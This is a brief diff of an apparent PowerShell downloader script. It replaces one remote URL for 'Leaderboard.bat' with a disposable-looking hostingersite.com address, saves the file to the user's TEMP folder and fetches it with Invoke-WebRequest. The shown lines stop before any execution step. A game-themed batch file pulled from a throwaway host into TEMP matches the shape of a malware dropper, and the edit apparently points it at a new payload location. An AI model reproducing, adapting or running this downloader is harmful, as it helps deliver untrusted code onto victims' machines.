@@ -1,4 +1,4 @@
-$batUrl = "https://burgercity.xyz/Leaderboard.bat"
+$batUrl = "https://mediumvioletred-mosquito-767246.hostingersite.com/Leaderboard.bat"
 $batPath = "$env:TEMP\Leaderboard.bat"
 
 Invoke-WebRequest -Uri $batUrl -OutFile $batPath
